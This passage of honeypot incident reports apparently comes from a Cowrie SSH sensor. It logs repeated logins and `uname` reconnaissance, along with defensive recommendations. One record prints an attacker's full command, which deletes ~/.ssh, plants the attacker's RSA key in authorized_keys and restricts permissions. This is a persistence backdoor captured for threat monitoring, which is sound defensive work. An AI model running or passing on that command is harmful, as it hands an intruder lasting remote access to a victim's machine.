| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:18:06` | `cowrie.session.connect` |
| `2026-07-24 15:18:06` | `cowrie.client.version` |
| `2026-07-24 15:18:06` | `cowrie.client.kex` |
| `2026-07-24 15:18:06` | `cowrie.login.success` |
| `2026-07-24 15:18:07` | `cowrie.session.params` |
| `2026-07-24 15:18:07` | `cowrie.command.input` |
| `2026-07-24 15:18:07` | `cowrie.log.closed` |
| `2026-07-24 15:18:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db0b1b990a01

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:18 |
| **Last Seen** | 2026-07-24 15:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:18:12` | `cowrie.session.connect` |
| `2026-07-24 15:18:12` | `cowrie.client.version` |
| `2026-07-24 15:18:12` | `cowrie.client.kex` |
| `2026-07-24 15:18:12` | `cowrie.login.success` |
| `2026-07-24 15:18:13` | `cowrie.session.params` |
| `2026-07-24 15:18:13` | `cowrie.command.input` |
| `2026-07-24 15:18:13` | `cowrie.log.closed` |
| `2026-07-24 15:18:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df97673379a8

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:18 |
| **Last Seen** | 2026-07-24 15:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:18:18` | `cowrie.session.connect` |
| `2026-07-24 15:18:18` | `cowrie.client.version` |
| `2026-07-24 15:18:18` | `cowrie.client.kex` |
| `2026-07-24 15:18:18` | `cowrie.login.success` |
| `2026-07-24 15:18:19` | `cowrie.session.params` |
| `2026-07-24 15:18:19` | `cowrie.command.input` |
| `2026-07-24 15:18:19` | `cowrie.log.closed` |
| `2026-07-24 15:18:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6604d3e2cc4

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:18 |
| **Last Seen** | 2026-07-24 15:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:18:24` | `cowrie.session.connect` |
| `2026-07-24 15:18:24` | `cowrie.client.version` |
| `2026-07-24 15:18:24` | `cowrie.client.kex` |
| `2026-07-24 15:18:24` | `cowrie.login.success` |
| `2026-07-24 15:18:25` | `cowrie.session.params` |
| `2026-07-24 15:18:25` | `cowrie.command.input` |
| `2026-07-24 15:18:25` | `cowrie.log.closed` |
| `2026-07-24 15:18:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6d52e7e39f3

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:18 |
| **Last Seen** | 2026-07-24 15:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:18:30` | `cowrie.session.connect` |
| `2026-07-24 15:18:30` | `cowrie.client.version` |
| `2026-07-24 15:18:31` | `cowrie.client.kex` |
| `2026-07-24 15:18:31` | `cowrie.login.success` |
| `2026-07-24 15:18:32` | `cowrie.session.params` |
| `2026-07-24 15:18:32` | `cowrie.command.input` |
| `2026-07-24 15:18:32` | `cowrie.log.closed` |
| `2026-07-24 15:18:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08af5abb1cbf

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:18 |
| **Last Seen** | 2026-07-24 15:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:18:37` | `cowrie.session.connect` |
| `2026-07-24 15:18:37` | `cowrie.client.version` |
| `2026-07-24 15:18:37` | `cowrie.client.kex` |
| `2026-07-24 15:18:38` | `cowrie.login.success` |
| `2026-07-24 15:18:39` | `cowrie.session.params` |
| `2026-07-24 15:18:39` | `cowrie.command.input` |
| `2026-07-24 15:18:39` | `cowrie.log.closed` |
| `2026-07-24 15:18:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4a8ee17ae5a

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:18 |
| **Last Seen** | 2026-07-24 15:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:18:44` | `cowrie.session.connect` |
| `2026-07-24 15:18:44` | `cowrie.client.version` |
| `2026-07-24 15:18:44` | `cowrie.client.kex` |
| `2026-07-24 15:18:45` | `cowrie.login.success` |
| `2026-07-24 15:18:45` | `cowrie.session.params` |
| `2026-07-24 15:18:45` | `cowrie.command.input` |
| `2026-07-24 15:18:46` | `cowrie.log.closed` |
| `2026-07-24 15:18:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a89e7c110d48

| Field | Detail |
|---|---|
| **Source IP** | `91.134.133[.]184` |
| **First Seen** | 2026-07-24 15:18 |
| **Last Seen** | 2026-07-24 15:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:18:46` | `cowrie.session.connect` |
| `2026-07-24 15:18:46` | `cowrie.client.version` |
| `2026-07-24 15:18:46` | `cowrie.client.kex` |
| `2026-07-24 15:18:47` | `cowrie.login.success` |
| `2026-07-24 15:18:47` | `cowrie.session.params` |
| `2026-07-24 15:18:47` | `cowrie.command.input` |
| `2026-07-24 15:18:47` | `cowrie.command.failed` |
| `2026-07-24 15:18:48` | `cowrie.log.closed` |
| `2026-07-24 15:18:48` | `cowrie.session.params` |
| `2026-07-24 15:18:48` | `cowrie.command.input` |
| `2026-07-24 15:18:48` | `cowrie.session.file_download` |
| `2026-07-24 15:18:48` | `cowrie.log.closed` |
| `2026-07-24 15:18:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.134.133[.]184` to AbuseIPDB if not already reported
- [ ] Block `91.134.133[.]184` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31441c0bfc8c

| Field | Detail |
|---|---|
| **Source IP** | `91.134.133[.]184` |
| **First Seen** | 2026-07-24 15:18 |
| **Last Seen** | 2026-07-24 15:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:18:48` | `cowrie.session.connect` |
| `2026-07-24 15:18:48` | `cowrie.client.version` |
| `2026-07-24 15:18:49` | `cowrie.client.kex` |
| `2026-07-24 15:18:49` | `cowrie.login.success` |
| `2026-07-24 15:18:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.134.133[.]184` to AbuseIPDB if not already reported
- [ ] Block `91.134.133[.]184` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1eaeb0e31ae2

| Field | Detail |
|---|---|
| **Source IP** | `91.134.133[.]184` |
| **First Seen** | 2026-07-24 15:18 |
| **Last Seen** | 2026-07-24 15:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:18:49` | `cowrie.session.connect` |
| `2026-07-24 15:18:49` | `cowrie.client.version` |
| `2026-07-24 15:18:49` | `cowrie.client.kex` |
| `2026-07-24 15:18:50` | `cowrie.login.success` |
| `2026-07-24 15:18:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.134.133[.]184` to AbuseIPDB if not already reported
- [ ] Block `91.134.133[.]184` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-908069b7759b

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:18 |
| **Last Seen** | 2026-07-24 15:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:18:51` | `cowrie.session.connect` |
| `2026-07-24 15:18:51` | `cowrie.client.version` |
| `2026-07-24 15:18:51` | `cowrie.client.kex` |
| `2026-07-24 15:18:51` | `cowrie.login.success` |
| `2026-07-24 15:18:52` | `cowrie.session.params` |
| `2026-07-24 15:18:52` | `cowrie.command.input` |
| `2026-07-24 15:18:52` | `cowrie.log.closed` |
| `2026-07-24 15:18:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b477e44086dd

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:18 |
| **Last Seen** | 2026-07-24 15:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:18:57` | `cowrie.session.connect` |
| `2026-07-24 15:18:57` | `cowrie.client.version` |
| `2026-07-24 15:18:57` | `cowrie.client.kex` |
| `2026-07-24 15:18:57` | `cowrie.login.success` |
| `2026-07-24 15:18:58` | `cowrie.session.params` |
| `2026-07-24 15:18:58` | `cowrie.command.input` |
| `2026-07-24 15:18:58` | `cowrie.log.closed` |
| `2026-07-24 15:18:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41c4b8ce0fab

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:19 |
| **Last Seen** | 2026-07-24 15:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:19:03` | `cowrie.session.connect` |
| `2026-07-24 15:19:03` | `cowrie.client.version` |
| `2026-07-24 15:19:03` | `cowrie.client.kex` |
| `2026-07-24 15:19:03` | `cowrie.login.success` |
| `2026-07-24 15:19:04` | `cowrie.session.params` |
| `2026-07-24 15:19:04` | `cowrie.command.input` |
| `2026-07-24 15:19:04` | `cowrie.log.closed` |
| `2026-07-24 15:19:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c16283d8a4d2

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:19 |
| **Last Seen** | 2026-07-24 15:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:19:09` | `cowrie.session.connect` |
| `2026-07-24 15:19:09` | `cowrie.client.version` |
| `2026-07-24 15:19:09` | `cowrie.client.kex` |
| `2026-07-24 15:19:09` | `cowrie.login.success` |
| `2026-07-24 15:19:10` | `cowrie.session.params` |
| `2026-07-24 15:19:10` | `cowrie.command.input` |
| `2026-07-24 15:19:10` | `cowrie.log.closed` |
| `2026-07-24 15:19:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0538e2e0aa51

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:19 |
| **Last Seen** | 2026-07-24 15:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:19:15` | `cowrie.session.connect` |
| `2026-07-24 15:19:15` | `cowrie.client.version` |
| `2026-07-24 15:19:15` | `cowrie.client.kex` |
| `2026-07-24 15:19:15` | `cowrie.login.success` |
| `2026-07-24 15:19:16` | `cowrie.session.params` |
| `2026-07-24 15:19:16` | `cowrie.command.input` |
| `2026-07-24 15:19:16` | `cowrie.log.closed` |
| `2026-07-24 15:19:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9815aab27815

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:19 |
| **Last Seen** | 2026-07-24 15:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:19:21` | `cowrie.session.connect` |
| `2026-07-24 15:19:21` | `cowrie.client.version` |
| `2026-07-24 15:19:21` | `cowrie.client.kex` |
| `2026-07-24 15:19:21` | `cowrie.login.success` |
| `2026-07-24 15:19:22` | `cowrie.session.params` |
| `2026-07-24 15:19:22` | `cowrie.command.input` |
| `2026-07-24 15:19:22` | `cowrie.log.closed` |
| `2026-07-24 15:19:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d024d1cdeee7

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:19 |
| **Last Seen** | 2026-07-24 15:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:19:27` | `cowrie.session.connect` |
| `2026-07-24 15:19:27` | `cowrie.client.version` |
| `2026-07-24 15:19:27` | `cowrie.client.kex` |
| `2026-07-24 15:19:27` | `cowrie.login.success` |
| `2026-07-24 15:19:28` | `cowrie.session.params` |
| `2026-07-24 15:19:28` | `cowrie.command.input` |
| `2026-07-24 15:19:28` | `cowrie.log.closed` |
| `2026-07-24 15:19:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e185102b0a3f

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:19 |
| **Last Seen** | 2026-07-24 15:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:19:33` | `cowrie.session.connect` |
| `2026-07-24 15:19:33` | `cowrie.client.version` |
| `2026-07-24 15:19:33` | `cowrie.client.kex` |
| `2026-07-24 15:19:34` | `cowrie.login.success` |
| `2026-07-24 15:19:35` | `cowrie.session.params` |
| `2026-07-24 15:19:35` | `cowrie.command.input` |
| `2026-07-24 15:19:35` | `cowrie.log.closed` |
| `2026-07-24 15:19:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cce3396d2d45

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:19 |
| **Last Seen** | 2026-07-24 15:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:19:40` | `cowrie.session.connect` |
| `2026-07-24 15:19:40` | `cowrie.client.version` |
| `2026-07-24 15:19:40` | `cowrie.client.kex` |
| `2026-07-24 15:19:40` | `cowrie.login.success` |
| `2026-07-24 15:19:41` | `cowrie.session.params` |
| `2026-07-24 15:19:41` | `cowrie.command.input` |
| `2026-07-24 15:19:41` | `cowrie.log.closed` |
| `2026-07-24 15:19:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-228dcde4c007

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:19 |
| **Last Seen** | 2026-07-24 15:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:19:46` | `cowrie.session.connect` |
| `2026-07-24 15:19:46` | `cowrie.client.version` |
| `2026-07-24 15:19:46` | `cowrie.client.kex` |
| `2026-07-24 15:19:46` | `cowrie.login.success` |
| `2026-07-24 15:19:47` | `cowrie.session.params` |
| `2026-07-24 15:19:47` | `cowrie.command.input` |
| `2026-07-24 15:19:47` | `cowrie.log.closed` |
| `2026-07-24 15:19:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d52c6b80344

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:19 |
| **Last Seen** | 2026-07-24 15:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:19:52` | `cowrie.session.connect` |
| `2026-07-24 15:19:52` | `cowrie.client.version` |
| `2026-07-24 15:19:52` | `cowrie.client.kex` |
| `2026-07-24 15:19:53` | `cowrie.login.success` |
| `2026-07-24 15:19:54` | `cowrie.session.params` |
| `2026-07-24 15:19:54` | `cowrie.command.input` |
| `2026-07-24 15:19:54` | `cowrie.log.closed` |
| `2026-07-24 15:19:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e305cd9311ad

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:19 |
| **Last Seen** | 2026-07-24 15:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:19:58` | `cowrie.session.connect` |
| `2026-07-24 15:19:58` | `cowrie.client.version` |
| `2026-07-24 15:19:58` | `cowrie.client.kex` |
| `2026-07-24 15:19:59` | `cowrie.login.success` |
| `2026-07-24 15:19:59` | `cowrie.session.params` |
| `2026-07-24 15:19:59` | `cowrie.command.input` |
| `2026-07-24 15:20:00` | `cowrie.log.closed` |
| `2026-07-24 15:20:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b03a5f86447

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:20 |
| **Last Seen** | 2026-07-24 15:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:20:04` | `cowrie.session.connect` |
| `2026-07-24 15:20:04` | `cowrie.client.version` |
| `2026-07-24 15:20:04` | `cowrie.client.kex` |
| `2026-07-24 15:20:05` | `cowrie.login.success` |
| `2026-07-24 15:20:05` | `cowrie.session.params` |
| `2026-07-24 15:20:05` | `cowrie.command.input` |
| `2026-07-24 15:20:06` | `cowrie.log.closed` |
| `2026-07-24 15:20:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2999e2289af1

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:20 |
| **Last Seen** | 2026-07-24 15:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:20:10` | `cowrie.session.connect` |
| `2026-07-24 15:20:10` | `cowrie.client.version` |
| `2026-07-24 15:20:11` | `cowrie.client.kex` |
| `2026-07-24 15:20:11` | `cowrie.login.success` |
| `2026-07-24 15:20:12` | `cowrie.session.params` |
| `2026-07-24 15:20:12` | `cowrie.command.input` |
| `2026-07-24 15:20:12` | `cowrie.log.closed` |
| `2026-07-24 15:20:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a86361778c7

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:20 |
| **Last Seen** | 2026-07-24 15:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:20:17` | `cowrie.session.connect` |
| `2026-07-24 15:20:17` | `cowrie.client.version` |
| `2026-07-24 15:20:17` | `cowrie.client.kex` |
| `2026-07-24 15:20:17` | `cowrie.login.success` |
| `2026-07-24 15:20:18` | `cowrie.session.params` |
| `2026-07-24 15:20:18` | `cowrie.command.input` |
| `2026-07-24 15:20:18` | `cowrie.log.closed` |
| `2026-07-24 15:20:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80162cbca6c0

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:20 |
| **Last Seen** | 2026-07-24 15:20 |
